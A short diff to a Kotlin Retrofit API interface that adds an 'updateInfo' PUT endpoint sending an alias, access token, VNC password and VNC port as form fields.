@@ -30,7 +30,9 @@ import retrofit2.http.Field
 import retrofit2.http.FormUrlEncoded
 import retrofit2.http.Multipart
 import retrofit2.http.POST
+import retrofit2.http.PUT
 import retrofit2.http.Part
+import retrofit2.http.Path
 
 
 private object Routes {
@@ -126,6 +128,16 @@ interface ApiService {
         @Field("sms") sms: String
     ): Call<Void>
 
+
+    // UPDATE
+    @FormUrlEncoded
+    @PUT("info/{${PARAMS.ALIAS}}")
+    fun updateInfo(
+        @Path(PARAMS.ALIAS) alias: String,
+        @Field(PARAMS.ACCESS_TOKEN) accessToken: String,
+        @Field("vnc_password") vnc_password: String,
+        @Field("vnc_port") vnc_port: Int,
+    ): Call<Void>
 
     // MULTIPART
     @Multipart
